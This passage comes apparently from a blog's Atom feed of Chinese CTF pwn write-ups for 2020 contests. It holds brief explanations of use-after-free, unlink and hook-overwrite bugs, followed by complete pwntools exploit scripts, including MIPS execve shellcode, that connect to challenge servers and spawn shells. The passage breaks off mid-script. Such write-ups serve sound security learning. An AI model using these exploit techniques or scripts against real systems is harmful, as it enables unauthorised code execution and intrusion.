class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process("./pwn")</span></span><br><span class="line">context.timeout = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">p = remote(<span class="string">"123.56.52.128"</span>,<span class="string">"45830"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./pwn"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"size?"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"content?"</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index ?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index ?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"what is your new content ?"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(<span class="number">0x6020C0</span><span class="number">-0x18</span>)+p64(<span class="number">0x6020C0</span><span class="number">-0x10</span>)+<span class="string">'\x00'</span>*<span class="number">0xd0</span>+p64(<span class="number">0xf0</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x1e8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x200</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xf8</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6020C0</span><span class="number">-8</span>))</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+p64(<span class="number">0x6020c0</span>)+<span class="string">'\x20\x26'</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>))<span class="number">-0x3C5600</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"><span class="keyword">if</span> ((libc.address&amp;<span class="number">0xfff</span>) == <span class="number">0</span>):</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6020c0</span>)+p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">edit(<span class="number">1</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">exp()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'fail'</span></span><br></pre></td></tr></table></figure><h3 id="EASY-ABNORMAL"><a href="#EASY-ABNORMAL" class="headerlink" title="EASY_ABNORMAL"></a>EASY_ABNORMAL</h3><p>湖湘杯的<a href="https://nuoye-blog.github.io/2020/11/03/c0045b88/">原题</a>，利用name来进行泄漏，得到libc地址。在堆上布置好one_gadget地址并free两个堆块得到堆地址。</p><p>接着用后面函数劫持栈地址从而执行onegadget。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./pwn"</span>).libc</span><br><span class="line">p = remote(<span class="string">"123.56.52.128"</span>,<span class="string">"10012"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"NAME"</span>)</span><br><span class="line">p.send(<span class="string">"%11$p"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"CHOICE :"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"cnt:"</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"CHOICE :"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"idx:"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"CHOICE :"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_name</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"CHOICE :"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"CHOICE :"</span>)</span><br><span class="line">p.sendline(<span class="string">"23333"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"INPUT:"</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">show_name()</span><br><span class="line">p.recvuntil(<span class="string">"INFO:"</span>)</span><br><span class="line">libc.address = int(p.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-0x20840</span></span><br><span class="line">add(p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc.address+one[<span class="number">3</span>]))</span><br><span class="line">add(<span class="string">'aaa'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"idx 2:"</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">backdoor(p64(<span class="number">0</span>)*<span class="number">4</span>+p64(heap+<span class="number">0x20</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="maj0rone"><a href="#maj0rone" class="headerlink" title="maj0rone"></a>maj0rone</h3><p>存在uaf，利用ioleak获得libc地址，然后修改<code>__malloc_hook</code>即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.timeout=<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">libc = ELF(<span class="string">"./pwn"</span>).libc</span><br><span class="line">p = remote(<span class="string">"123.56.52.128"</span>,<span class="string">"18523"</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"please answer the question\n"</span>)</span><br><span class="line">p.sendline(str(<span class="number">80</span>))</span><br><span class="line">p.recvuntil(<span class="string">"______?"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"start_the_game,yes_or_no?"</span>)</span><br><span class="line">p.sendline(<span class="string">'n'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index ?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index ?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"__new_content ?"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">add(<span class="number">0x208</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+p64(<span class="number">0xe1</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25'</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) <span class="number">-0x3C56A3</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"><span class="keyword">if</span> ((libc.address&amp;<span class="number">0xfff</span>) == <span class="number">0</span>):</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">'\x00'</span>*<span class="number">0xb</span>+p64(libc.sym[<span class="string">'realloc'</span>]+<span class="number">6</span>)+p64(libc.address+one[<span class="number">3</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p,'b malloc')</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"please answer the question\n"</span>)</span><br><span class="line">p.sendline(str(<span class="number">80</span>))</span><br><span class="line">p.recvuntil(<span class="string">"______?"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">exp()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'fail'</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h2&gt;&lt;h3 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2020太湖杯pwn-WP</title>
    <link href="https://nuoye-blog.github.io/2020/11/07/833b19a1/"/>
    <id>https://nuoye-blog.github.io/2020/11/07/833b19a1/</id>
    <published>2020-11-07T12:30:00.000Z</published>
    <updated>2020-11-07T12:16:54.605Z</updated>
    
    <content type="html"><![CDATA[<h3 id="easyKooc"><a href="#easyKooc" class="headerlink" title="easyKooc"></a>easyKooc</h3><p>简单的mips题目，静态地址，存在UAF漏洞，并且有RWX段，可执行shellcode。</p><p>利用UAF将shellcode写到可执行段上，然后修改got表跳过去执行即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'mips'</span></span><br><span class="line"><span class="comment">#p = process(["qemu-mipsel-static", "-L", "./mipsel-linux-gnu", "./easyKooc"])</span></span><br><span class="line"><span class="comment">#p = gdb.debug("./easyKooc",' b *0x412140')</span></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">p = remote(<span class="string">"121.36.166.138"</span>,<span class="string">"8893"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Plz input your choice"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Plz input your todo id!"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"input your content"</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Plz input your choice"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Plz input your todo id!"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">code = <span class="string">'''</span></span><br><span class="line"><span class="string">lui $t6,0x6e69</span></span><br><span class="line"><span class="string">ori $t6,$t6,0x622f</span></span><br><span class="line"><span class="string">sw $t6,28($sp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">lui $t7,0x6873</span></span><br><span class="line"><span class="string">ori $t7,$t7,0x2f2f</span></span><br><span class="line"><span class="string">sw $t7,32($sp)</span></span><br><span class="line"><span class="string">sw $zero,36($sp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">la $a0,28($sp) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">addiu $a1,$zero,0</span></span><br><span class="line"><span class="string">addiu $a2,$zero,0</span></span><br><span class="line"><span class="string">addiu $v0,$zero,4011</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall 0x40404 </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">code = asm(code,arch=<span class="string">'mips'</span>)</span><br><span class="line"><span class="keyword">print</span> len(code)</span><br><span class="line">p.recvuntil(<span class="string">"Plz input your motto!"</span>)</span><br><span class="line">p.sendline(<span class="string">'111'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"gift for you: "</span>)</span><br><span class="line">stack = int(p.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'1111'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'1111'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf</span>,p32(<span class="number">0x41213e</span><span class="number">-8</span>))</span><br><span class="line">add(<span class="number">0xe</span>,p32(<span class="number">1</span>))</span><br><span class="line">add(<span class="number">0xd</span>,p32(<span class="number">1</span>))</span><br><span class="line">add(<span class="number">0xc</span>,<span class="string">'\x00'</span>*<span class="number">2</span>+code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,p32(<span class="number">0x41204a</span><span class="number">-8</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">'2'</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">'\x00'</span>*<span class="number">0xe</span>+p32(<span class="number">0x412140</span>))</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="seven-hero"><a href="#seven-hero" class="headerlink" title="seven hero"></a>seven hero</h3><p>2.29的题目，edit大小为0的时候，会将堆块free掉，但是不会清空指针，可以UAF。</p><p>先申请到标志位将其赋值得到gift函数的执行权限，得到libc地址。</p><p>再一次用UAF漏洞申请到<code>__free_hook</code>处修改其为system函数地址即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = "DEBUG"</span></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>, <span class="string">"splitw"</span>, <span class="string">"-h"</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p = process("/tmp/pwn", env=&#123;"LD_PRELOAD":"/tmp/libc.so.6"&#125;)</span></span><br><span class="line"><span class="string">libc = ELF("/tmp/libc.so.6")</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p = remote(<span class="string">"119.3.89.93"</span>,<span class="string">"8015"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_choice</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Input your choice:"</span>, str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    read_choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"please input index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"please input size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    read_choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(idx))</span><br><span class="line">    <span class="comment"># p.recvuntil("Success")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size ,content = <span class="number">0</span>)</span>:</span></span><br><span class="line">    read_choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input size: "</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> content != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    read_choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span><span class="params">(hack_string)</span>:</span></span><br><span class="line">    read_choice(<span class="number">666</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"there is a gift: "</span>)</span><br><span class="line">    gift = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">    gift = gift[:<span class="number">-1</span>]</span><br><span class="line">    p.send(hack_string)</span><br><span class="line">    <span class="keyword">return</span> gift</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span><span class="params">()</span>:</span></span><br><span class="line">    read_choice(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x9</span>):</span><br><span class="line">add(i,<span class="number">0x18</span>,<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x7</span>):</span><br><span class="line">free(<span class="number">8</span>-i)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#add(2,0x18,'\x00'*0x10)</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00\x00'</span>)<span class="number">-0x270</span></span><br><span class="line">print(hex(heap))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x18</span>,p64(heap+<span class="number">0x250</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>,<span class="string">'a'</span>)</span><br><span class="line">libc.address = int(gift(<span class="string">'111'</span>),<span class="number">16</span>)<span class="number">-0x264140</span></span><br><span class="line">print(hex(libc.address))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x50</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span 